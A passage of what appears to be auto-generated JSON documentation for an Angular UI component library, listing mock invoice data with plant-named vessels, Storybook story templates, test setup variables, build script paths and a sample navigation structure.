Skullcap',\n    'allocated': 464448,\n    'total': 483236\n}, {\n    'invoiceNo': 204028785,\n    'voyageNo': 17325,\n    'vesselName': 'Coca',\n    'allocated': 412084,\n    'total': 319574\n}, {\n    'invoiceNo': 215898267,\n    'voyageNo': 17556,\n    'vesselName': 'Fendler\\'s Pennycress',\n    'allocated': 467666,\n    'total': 401105\n}, {\n    'invoiceNo': 283652560,\n    'voyageNo': 16693,\n    'vesselName': 'Densespike Blazing Star',\n    'allocated': 428117,\n    'total': 422318\n}, {\n    'invoiceNo': 261627486,\n    'voyageNo': 16742,\n    'vesselName': 'Texas Crab Apple',\n    'allocated': 445829,\n    'total': 389401\n}, {\n    'invoiceNo': 224657257,\n    'voyageNo': 17344,\n    'vesselName': 'Philodendron',\n    'allocated': 439503,\n    'total': 197357\n}, {\n    'invoiceNo': 287799672,\n    'voyageNo': 18559,\n    'vesselName': 'Knife Acacia',\n    'allocated': 457225,\n    'total': 152586\n}, {\n    'invoiceNo': 249855102,\n    'voyageNo': 17210,\n    'vesselName': 'Catnip Noseburn',\n    'allocated': 490793,\n    'total': 295054\n}, {\n    'invoiceNo': 217932979,\n    'voyageNo': 18294,\n    'vesselName': 'Brickellbush Goldenweed',\n    'allocated': 476987,\n    'total': 90357\n}, {\n    'invoiceNo': 287187542,\n    'voyageNo': 18123,\n    'vesselName': 'Threecornerjack',\n    'allocated': 436103,\n    'total': 98431\n}, {\n    'invoiceNo': 277359566,\n    'voyageNo': 17549,\n    'vesselName': 'Longleaf Isodendrion',\n    'allocated': 456456,\n    'total': 292117\n}, {\n    'invoiceNo': 250935681,\n    'voyageNo': 16429,\n    'vesselName': 'Purple False Gilyflower',\n    'allocated': 465653,\n    'total': 396830\n}, {\n    'invoiceNo': 261927204,\n    'voyageNo': 16524,\n    'vesselName': 'Nevada Pea',\n    'allocated': 411190,\n    'total': 393332\n}, {\n    'invoiceNo': 203826163,\n    'voyageNo': 17608,\n    'vesselName': 'Alaska Tall Bluebells',\n    'allocated': 487745,\n    'total': 273514\n}, {\n    'invoiceNo': 253006185,\n    'voyageNo': 17795,\n    'vesselName': 'Cupped Monolopia',\n    'allocated': 491265,\n    'total': 117277\n}, {\n    'invoiceNo': 212369622,\n    'voyageNo': 17867,\n    'vesselName': 'Small Rocklettuce',\n    'allocated': 408880,\n    'total': 530690\n}, {\n    'invoiceNo': 259555515,\n    'voyageNo': 16488,\n    'vesselName': 'Torchwood',\n    'allocated': 428843,\n    'total': 63208\n}, {\n    'invoiceNo': 209064476,\n    'voyageNo': 17957,\n    'vesselName': 'Saline Saltbush',\n    'allocated': 452602,\n    'total': 144560\n}, {\n    'invoiceNo': 246761266,\n    'voyageNo': 18253,\n    'vesselName': 'White Snakeroot',\n    'allocated': 485075,\n    'total': 133101\n}, {\n    'invoiceNo': 277989052,\n    'voyageNo': 15535,\n    'vesselName': 'Bayberry',\n    'allocated': 411595,\n    'total': 549473\n}, {\n    'invoiceNo': 246327302,\n    'voyageNo': 17427,\n    'vesselName': 'China Violet',\n    'allocated': 426753,\n    'total': 406017\n}, {\n    'invoiceNo': 225951335,\n    'voyageNo': 15473,\n    'vesselName': 'Olympic Saxifrage',\n    'allocated': 429650,\n    'total': 413380\n}, {\n    'invoiceNo': 206579573,\n    'voyageNo': 17600,\n    'vesselName': 'False Sun-rose',\n    'allocated': 464983,\n    'total': 474611\n}, {\n    'invoiceNo': 243806520,\n    'voyageNo': 15148,\n    'vesselName': 'Bracted Lousewort',\n    'allocated': 486907,\n    'total': 419416\n}, {\n    'invoiceNo': 248037555,\n    'voyageNo': 16554,\n    'vesselName': 'Beach Strawberry',\n    'allocated': 446762,\n    'total': 543982\n}, {\n    'invoiceNo': 233807782,\n    'voyageNo': 18251,\n    'vesselName': 'Western Bog Yellowcress',\n    'allocated': 485749,\n    'total': 206612\n}, {\n    'invoiceNo': 231399318,\n    'voyageNo': 18647,\n    'vesselName': 'Nevada Pea',\n    'allocated': 416624,\n    'total': 73797\n}, {\n    'invoiceNo': 210265421,\n    'voyageNo': 17334,\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\n    'allocated': 493556,\n    'total': 485404\n}, {\n    'invoiceNo': 270110020,\n    'voyageNo': 15750,\n    'vesselName': 'Dotted Lancepod',\n    'allocated': 439009,\n    'total': 85163\n}, {\n    'invoiceNo': 203365491,\n    'voyageNo': 15574,\n    'vesselName': 'Arizona Whitefeather',\n    'allocated': 424981,\n    'total': 72976\n}, {\n    'invoiceNo': 258026382,\n    'voyageNo': 17991,\n    'vesselName': 'Rough Blackfoot',\n    'allocated': 412805,\n    'total': 525915\n}, {\n    'invoiceNo': 216800989,\n    'voyageNo': 18938,\n    'vesselName': 'Narrowleaf Wirelettuce',\n    'allocated': 437679,\n    'total': 384426\n}, {\n    'invoiceNo': 224161270,\n    'voyageNo': 15475,\n    'vesselName': 'Utah Sweetvetch',\n    'allocated': 414735,\n    'total': 398700\n}, {\n    'invoiceNo': 224587536,\n    'voyageNo': 16133,\n    'vesselName': 'Palau Horsfieldia',\n    'allocated': 409836,\n    'total': 55599\n}, {\n    'invoiceNo': 200019644,\n    'voyageNo': 16430,\n    'vesselName': 'Cracked Lichen',\n    'allocated': 491135,\n    'total': 400179\n}, {\n    'invoiceNo': 212973644,\n    'voyageNo': 16527,\n    'vesselName': 'California Valerian',\n    'allocated': 465742,\n    'total': 428281\n}, {\n    'invoiceNo': 236726871,\n    'voyageNo': 15145,\n    'vesselName': 'Spear Saltbush',\n    'allocated': 420067,\n    'total': 236753\n}, {\n    'invoiceNo': 262498296,\n    'voyageNo': 16350,\n    'vesselName': 'Rose Globemallow',\n    'allocated': 472387,\n    'total': 270655\n}, {\n    'invoiceNo': 237959767,\n    'voyageNo': 18739,\n    'vesselName': 'Cithara Buckwheat',\n    'allocated': 447466,\n    'total': 358262\n}, {\n    'invoiceNo': 200461954,\n    'voyageNo': 18921,\n    'vesselName': 'Rough Potato',\n    'allocated': 425594,\n    'total': 459497\n}, {\n    'invoiceNo': 266033549,\n    'voyageNo': 16150,\n    'vesselName': 'Distictis',\n    'allocated': 447636,\n    'total': 286350\n}, {\n    'invoiceNo': 289893009,\n    'voyageNo': 18219,\n    'vesselName': 'Piedmont False Pimpernel',\n    'allocated': 474098,\n    'total': 163688\n}, {\n    'invoiceNo': 241320630,\n    'voyageNo': 15558,\n    'vesselName': 'Southern Mexican Sage',\n    'allocated': 431537,\n    'total': 419734\n}, {\n    'invoiceNo': 211404482,\n    'voyageNo': 18502,\n    'vesselName': 'Bearded Sprangletop',\n    'allocated': 458939,\n    'total': 89714\n}, {\n    'invoiceNo': 247917426,\n    'voyageNo': 18238,\n    'vesselName': 'Small-flowered Calycadenia',\n    'allocated': 406198,\n    'total': 351785\n}, {\n    'invoiceNo': 234633032,\n    'voyageNo': 17269,\n    'vesselName': 'Pritchardia',\n    'allocated': 442188,\n    'total': 414638\n}, {\n    'invoiceNo': 216477974,\n    'voyageNo': 15454,\n    'vesselName': 'Thread Lichen',\n    'allocated': 474232,\n    'total': 537142\n}, {\n    'invoiceNo': 201667786,\n    'voyageNo': 15130,\n    'vesselName': 'Margined Stickseed',\n    'allocated': 493253,\n    'total': 364145\n}, {\n    'invoiceNo': 271891491,\n    'voyageNo': 15468,\n    'vesselName': 'Eggleaf Milkwort',\n    'allocated': 457747,\n    'total': 316780\n}, {\n    'invoiceNo': 223744528,\n    'voyageNo': 16074,\n    'vesselName': 'Hall\\'s Mule-ears',\n    'allocated': 439241,\n    'total': 301239\n}, {\n    'invoiceNo': 202936481,\n    'voyageNo': 18868,\n    'vesselName': 'Rinodina Lichen',\n    'allocated': 488291,\n    'total': 504547\n}, {\n    'invoiceNo': 284610720,\n    'voyageNo': 17077,\n    'vesselName': 'Saber Bogmat',\n    'allocated': 417817,\n    'total': 246511\n}, {\n    'invoiceNo': 286535852,\n    'voyageNo': 15935,\n    'vesselName': 'Brodiaea',\n    'allocated': 479989,\n    'total': 276206\n}, {\n    'invoiceNo': 206000446,\n    'voyageNo': 17528,\n    'vesselName': 'Utah Serviceberry',\n    'allocated': 454837,\n    'total': 399887\n}, {\n    'invoiceNo': 283036494,\n    'voyageNo': 16899,\n    'vesselName': 'Lehua Makanoe',\n    'allocated': 452547,\n    'total': 96023\n}, {\n    'invoiceNo': 270371913,\n    'voyageNo': 16886,\n    'vesselName': 'Rim Lichen',\n    'allocated': 439082,\n    'total': 269557\n}, {\n    'invoiceNo': 273513209,\n    'voyageNo': 15570,\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\n    'allocated': 471494,\n    'total': 131750\n}, {\n    'invoiceNo': 215244773,\n    'voyageNo': 17618,\n    'vesselName': 'Lesser Pond Sedge',\n    'allocated': 472422,\n    'total': 505921\n}, {\n    'invoiceNo': 264815411,\n    'voyageNo': 17008,\n    'vesselName': 'Browne\\'s Savory',\n    'allocated': 464834,\n    'total': 420180\n}, {\n    'invoiceNo': 260793904,\n    'voyageNo': 18868,\n    'vesselName': 'Bastard Copperleaf',\n    'allocated': 403983,\n    'total': 190831\n}, {\n    'invoiceNo': 228919503,\n    'voyageNo': 16736,\n    'vesselName': 'Himalayan Cypress',\n    'allocated': 418664,\n    'total': 450233\n}, {\n    'invoiceNo': 225534860,\n    'voyageNo': 18374,\n    'vesselName': 'Fiddleleaf Hawksbeard',\n    'allocated': 495477,\n    'total': 528500\n}, {\n    'invoiceNo': 205039289,\n    'voyageNo': 15221,\n    'vesselName': 'Maui Cyanea',\n    'allocated': 434081,\n    'total': 79021\n}, {\n    'invoiceNo': 219730920,\n    'voyageNo': 18931,\n    'vesselName': 'Garden Sorrel',\n    'allocated': 442584,\n    'total': 193166\n}, {\n    'invoiceNo': 229994865,\n    'voyageNo': 16404,\n    'vesselName': 'Waialeale Dubautia',\n    'allocated': 414377,\n    'total': 195495\n}, {\n    'invoiceNo': 289807557,\n    'voyageNo': 16151,\n    'vesselName': 'Onetooth Woodfern',\n    'allocated': 415673,\n    'total': 202974\n}, {\n    'invoiceNo': 289750833,\n    'voyageNo': 15827,\n    'vesselName': 'Greenland Orange Lichen',\n    'allocated': 416432,\n    'total': 146021\n}, {\n    'invoiceNo': 243948439,\n    'voyageNo': 18154,\n    'vesselName': 'Leafy Reedgrass',\n    'allocated': 441439,\n    'total': 248631\n}, {\n    'invoiceNo': 266718010,\n    'voyageNo': 15322,\n    'vesselName': 'Largeleaf Marshpennywort',\n    'allocated': 436736,\n    'total': 256997\n}, {\n    'invoiceNo': 285338933,\n    'voyageNo': 18884,\n    'vesselName': 'Musk Okra',\n    'allocated': 414918,\n    'total': 475276\n}, {\n    'invoiceNo': 284544908,\n    'voyageNo': 16825,\n    'vesselName': 'Stegonia Moss',\n    'allocated': 486396,\n    'total': 210718\n}, {\n    'invoiceNo': 200951860,\n    'voyageNo': 15681,\n    'vesselName': 'Black Rock Townsend Daisy',\n    'allocated': 437133,\n    'total': 358340\n}, {\n    'invoiceNo': 248838992,\n    'voyageNo': 18254,\n    'vesselName': 'Kern Canyon Clarkia',\n    'allocated': 414245,\n    'total': 164454\n}, {\n    'invoiceNo': 274109340,\n    'voyageNo': 18252,\n    'vesselName': 'Squarrose Knapweed',\n    'allocated': 408814,\n    'total': 159690\n}, {\n    'invoiceNo': 219721177,\n    'voyageNo': 16331,\n    'vesselName': 'Lake County Dwarf-flax',\n    'allocated': 496150,\n    'total': 404922\n}, {\n    'invoiceNo': 272212685,\n    'voyageNo': 15395,\n    'vesselName': 'Ferngrass',\n    'allocated': 432853,\n    'total': 191127\n}, {\n    'invoiceNo': 243182762,\n    'voyageNo': 18321,\n    'vesselName': 'Marsh Grass',\n    'allocated': 462472,\n    'total': 452940\n}, {\n    'invoiceNo': 277839539,\n    'voyageNo': 17421,\n    'vesselName': 'Prairie Straw Sedge',\n    'allocated': 406837,\n    'total': 271284\n}, {\n    'invoiceNo': 207952597,\n    'voyageNo': 17197,\n    'vesselName': 'Doublehorn Calicoflower',\n    'allocated': 477735,\n    'total': 400959\n}, {\n    'invoiceNo': 260636315,\n    'voyageNo': 15453,\n    'vesselName': 'Palmer\\'s Goldenrod',\n    'allocated': 450419,\n    'total': 309897\n}, {\n    'invoiceNo': 256449906,\n    'voyageNo': 15189,\n    'vesselName': 'Oregon Checkerbloom',\n    'allocated': 435139,\n    'total': 139814\n}, {\n    'invoiceNo': 230023430,\n    'voyageNo': 15665,\n    'vesselName': 'Duckweed',\n    'allocated': 449282,\n    'total': 209512\n}, {\n    'invoiceNo': 226217229,\n    'voyageNo': 18462,\n    'vesselName': 'Disc Lichen',\n    'allocated': 471214,\n    'total': 58962\n}, {\n    'invoiceNo': 239201753,\n    'voyageNo': 18676,\n    'vesselName': 'Antifever Fontinalis Moss',\n    'allocated': 456585,\n    'total': 146024\n}, {\n    'invoiceNo': 235303844,\n    'voyageNo': 16223,\n    'vesselName': 'Miracle Fruit',\n    'allocated': 467877,\n    'total': 150931\n}, {\n    'invoiceNo': 217943418,\n    'voyageNo': 15418,\n    'vesselName': 'Little Gumweed',\n    'allocated': 494402,\n    'total': 355363\n}, {\n    'invoiceNo': 289788898,\n    'voyageNo': 15038,\n    'vesselName': 'Parish\\'s Oxytheca',\n    'allocated': 464853,\n    'total': 472823\n}, {\n    'invoiceNo': 280499130,\n    'voyageNo': 18914,\n    'vesselName': 'Jelly Lichen',\n    'allocated': 486477,\n    'total': 522679\n}, {\n    'invoiceNo': 223812339,\n    'voyageNo': 18298,\n    'vesselName': 'Evermann\\'s Fleabane',\n    'allocated': 453418,\n    'total': 50034\n}, {\n    'invoiceNo': 226331833,\n    'voyageNo': 17046,\n    'vesselName': 'Munj Sweetcane',\n    'allocated': 442239,\n    'total': 447072\n}, {\n    'invoiceNo': 226842057,\n    'voyageNo': 16491,\n    'vesselName': 'Trichostomum Moss',\n    'allocated': 450732,\n    'total': 471203\n}, {\n    'invoiceNo': 218377093,\n    'voyageNo': 18157,\n    'vesselName': 'Brown Stringybark',\n    'allocated': 441668,\n    'total': 464837\n}, {\n    'invoiceNo': 282690677,\n    'voyageNo': 16864,\n    'vesselName': 'Whorled Milkwort',\n    'allocated': 424456,\n    'total': 241177\n  }]\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
                }
            ],
            "libs/common/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/datatable/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/datatable/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/core/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/core/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/drawer/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/error-handler/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/form/src/test.ts": [
                {
                    "name": "context",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/test.ts",
                    "type": "",
                    "defaultValue": "require.context('./', true, /\\.spec\\.ts$/)"
                },
                {
                    "name": "require",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/test.ts",
                    "type": "any"
                }
            ],
            "libs/form/src/lib/number-input/value-unit-input.stories.ts": [
                {
                    "name": "control",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                    "type": "",
                    "defaultValue": "new FormControl({ value: 32.123, unit: 'C' }, Validators.required)"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args) => {\n  return {\n    component: NumberUnitInputComponent,\n    props: {\n      ...args,\n      control,\n      change: action('Value changed'),\n    },\n    template: `\n<mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-unit-input (ngModelChange)=\"change($event)\"\n      [fractionSize]=\"fractionSize\"\n      [list]=\"units\"\n      [readonly]=\"readonly\"\n      [formControl]=\"control\"\n      [unitPlaceholder]=\"unitPlaceholder\"\n      [unitClearText]=\"unitClearText\"\n      [unitOptional]=\"unitOptional\"\n      [placeholder]=\"placeholder\">\n      </sto-number-unit-input>\n    </mat-form-field><br>\n    {{control.value | json}}\n  </mat-card>`\n  };\n}"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                }
            ],
            "libs/error-handler/src/lib/error-handler/token.ts": [
                {
                    "name": "CUSTOM_ERROR_HANDLER",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/lib/error-handler/token.ts",
                    "type": "",
                    "defaultValue": "new InjectionToken<ErrorHandler>('sto.custom-error-handler')"
                },
                {
                    "name": "ERROR_LOGGER",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/error-handler/src/lib/error-handler/token.ts",
                    "type": "",
                    "defaultValue": "new InjectionToken<ErrorLogger>('sto.error-logger')"
                }
            ],
            "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts": [
                {
                    "name": "dialogConfig",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                    "type": "",
                    "defaultValue": "new MatDialogConfig()"
                },
                {
                    "name": "Usage",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
                    "type": "Story<ConfirmDemoComponent>",
                    "defaultValue": "(args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n}"
                }
            ],
            "apps/oilmod-web/src/environments/environment.prod.ts": [
                {
                    "name": "environment",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "apps/oilmod-web/src/environments/environment.prod.ts",
                    "type": "object",
                    "defaultValue": "{\n  production: true,\n}"
                }
            ],
            "apps/oilmod-web/src/environments/environment.ts": [
                {
                    "name": "environment",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "apps/oilmod-web/src/environments/environment.ts",
                    "type": "object",
                    "defaultValue": "{\n  production: false,\n}"
                }
            ],
            "libs/common/src/lib/sto-filter/filter-panel.stories.ts": [
                {
                    "name": "FilterPanel",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                    "type": "",
                    "defaultValue": "Template.bind({})"
                },
                {
                    "name": "Template",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/common/src/lib/sto-filter/filter-panel.stories.ts",
                    "type": "Story<>",
                    "defaultValue": "(args: StoFilterPanelComponent) => {\n  return {\n    component: StoFilterPanelComponent,\n    props: args,\n    template: `\n      <sto-filter-panel class=\"sto-form\"\n                        [expandable]=\"expandable\"\n                        [expanded]=\"expanded\"\n                        (toggled)=\"toggled()\">\n          <sto-filter-title>{{ title }}</sto-filter-title>\n          <sto-filter-table-actions>\n              <button mat-icon-button>\n                  <mat-icon>add</mat-icon>\n              </button>\n          </sto-filter-table-actions>\n          <div class=\"sto-form\"\n               stoGrid>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 1</mat-label>\n                  <input matInput>\n              </mat-form-field>\n              <mat-form-field floatLabel=\"always\"\n              stoFormField\n                              stoGridColumn>\n                  <mat-label>Field 2 (multi)</mat-label>\n                  <mat-select [multiple]=\"true\">\n                      <mat-option [value]=\"1\">{{1}}</mat-option>\n                      <mat-option [value]=\"2\">{{2}}</mat-option>\n                      <mat-option [value]=\"3\">{{3}}</mat-option>\n                      <mat-option [value]=\"4\">{{4}}</mat-option>\n                  </mat-select>\n              </mat-form-field>\n              <div stoGridColumn\n                   [stoGridColumnDouble]=\"true\"\n                   stoGridSpacer></div>\n          </div>\n      </sto-filter-panel>`\n  };\n}"
                }
            ],
            "apps/oilmod-web-e2e/src/support/app.po.ts": [
                {
                    "name": "getGreeting",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "apps/oilmod-web-e2e/src/support/app.po.ts",
                    "type": "",
                    "defaultValue": "() => cy.get('h1')"
                }
            ],
            "tools/scripts/build-scss.ts": [
                {
                    "name": "importer",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/build-scss.ts",
                    "type": "",
                    "defaultValue": "require('node-sass-tilde-importer')"
                },
                {
                    "name": "out",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/build-scss.ts",
                    "type": "",
                    "defaultValue": "path.join(root, 'dist', 'libs', 'core')"
                },
                {
                    "name": "promises",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/build-scss.ts",
                    "type": "[]",
                    "defaultValue": "[\n  processScss('./libs/core/src/ngx-stoui.scss', path.join(out, 'ngx-stoui.css')),\n  processScss('./libs/core/src/style/datatable/ngx-datatable.scss', path.join(out, 'ngx-datatable.css')),\n]"
                },
                {
                    "name": "root",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/build-scss.ts",
                    "type": "",
                    "defaultValue": "path.join(__dirname, '../../')"
                },
                {
                    "name": "writeFile",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "tools/scripts/build-scss.ts",
                    "type": "",
                    "defaultValue": "promisify(writeFileCb)"
                }
            ],
            "libs/form/src/lib/sto-select-filter/item-list.ts": [
                {
                    "name": "items",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-select-filter/item-list.ts",
                    "type": "[]",
                    "defaultValue": "[\n  {id: 1, name: 'TEST1', longName: 'LONG TEST1'},\n  {id: 2, name: 'TEST2', longName: 'LONG TEST2'},\n  {id: 3, name: 'TEST3', longName: 'LONG TEST3'},\n  {id: 4, name: 'TEST4', longName: 'LONG TEST4'},\n  {id: 5, name: 'TEST5', longName: 'LONG TEST5'},\n  {id: 6, name: 'TEST6', longName: 'LONG TEST6'},\n  {id: 7, name: 'TEST7', longName: 'LONG TEST7'},\n  {id: 8, name: 'TEST8', longName: 'LONG TEST8'},\n  {id: 9, name: 'TEST9', longName: 'LONG TEST9'},\n  {id: 10, name: 'TEST10', longName: 'LONG TEST10'},\n]"
                }
            ],
            "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts": [
                {
                    "name": "MultiSelect",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                    "type": "Story<any>",
                    "defaultValue": "(args) => ( {\n  props: { ...args }, template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n  <mat-form-field class=\"sto-form__field\"\n                  floatLabel=\"always\" >\n    <mat-label>Multiselect with filter</mat-label>\n    <mat-select [multiple]=\"true\"\n                (selectionChange)=\"valueChange($event)\"\n                [value]=\"selected\">\n      <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                         [selected]=\"select?.length\"\n                         [isFilter]=\"true\"\n                         [focusIfNoValue]=\"focusIfNoValue\"\n                         [isMulti]=\"true\"\n                         (valueChanges)=\"filteredItems = filter($event, allItems)\"\n                         (selectAll)=\"selected = $event ? filteredItems :[]; selectAll($event)\"></sto-select-filter>\n      <mat-option *ngFor=\"let opt of filteredItems\"\n                  [value]=\"opt\">{{opt.name}}</mat-option>\n    </mat-select>\n  </mat-form-field>\n</mat-card>`\n} )"
                },
                {
                    "name": "SingleSelect",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                    "type": "Story<Record<string, unknown>>",
                    "defaultValue": "(args) => ( {\n  props: { ...args },\n  template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\" >\n    <mat-form-field  class=\"sto-form__field\" floatLabel=\"always\">\n    <mat-label>Select with filter</mat-label>\n      <mat-select [multiple]=\"false\" [value]=\"selected\">\n        <sto-select-filter (keydown.space)=\"$event.stopPropagation()\"\n                           [isFilter]=\"isFilter\"\n                           [focusIfNoValue]=\"focusIfNoValue\"\n                           [isMulti]=\"false\"\n                           (valueChanges)=\"filteredItems = filter($event, allItems)\"></sto-select-filter>\n        <mat-option *ngFor=\"let opt of filteredItems\"\n                    [value]=\"opt\">{{opt.name}}</mat-option>\n      </mat-select>\n    </mat-form-field>\n</mat-card>`\n} )"
                }
            ],
            "libs/drawer/src/lib/sto-navigation/navigation.ts": [
                {
                    "name": "navigation",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                    "type": "object",
                    "defaultValue": "{\n  'name': 'Web applications',\n  'groups': [\n    {\n      'name': 'Application 1',\n      'items': [\n        {\n          'id': 'a11',\n          'name': 'Application 1.1',\n          'svgIcon': false,\n          'icon': 'build',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a11'\n            ]\n          }\n        },\n        {\n          'id': 'a12',\n          'name': 'Application 1.2',\n          'svgIcon': false,\n          'icon': 'attach_money',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a12'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 2',\n      'external': false,\n      'items': [\n        {\n          'id': 'a2',\n          'name': 'Application 2',\n          'svgIcon': false,\n          'icon': 'train',\n          'command': {\n            'type': 'navigate',\n            'arguments': [\n              'a2'\n            ]\n          }\n        }\n      ]\n    },\n    {\n      'name': 'Application 3',\n      'items': [\n        {\n          'id': 'a3',\n          'name': 'Application 3',\n          'svgIcon': false,\n          'icon': 'local_library',\n          'command': {\n            'type': 'externalLinkNewWindow',\n            'arguments': []\n          }\n        }\n      ]\n    }\n  ]\n}"
                },
                {
                    "name": "subNavigation",
                    "ctype": "miscellaneous",
                    "subtype": "variable",
                    "file": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                    "type": "object",
                    "defaultValue": "{\n  'name': 'Application 2',\n  'groups': [\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'date_range',\n          'name': 'Section 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '1'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'format_list_bulleted',\n          'name': 'Section 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '2'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'train',\n          'name': 'Section 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '3'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'access_time',\n          'name': 'Section 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'description',\n          'name': 'Section 5',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '5'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        }\n      ],\n      'hasDivider': false,\n      'svgIcon': false,\n      'icon': null\n    },\n    {\n      'name': null,\n      'items': [\n        {\n          'icon': 'train',\n          'name': 'SubSection 1',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '11'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'person',\n          'name': 'SubSection 2',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '12'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'business',\n          'name': 'SubSection 3',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              'SubSection 13'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n        },\n        {\n          'icon': 'settings',\n          'name': 'SubSection 4',\n          'command': {\n            'type': 'internalLink',\n            'arguments': [\n              '4'\n            ]\n          },\n          'svgIcon': false,\n          'subItems': []\n 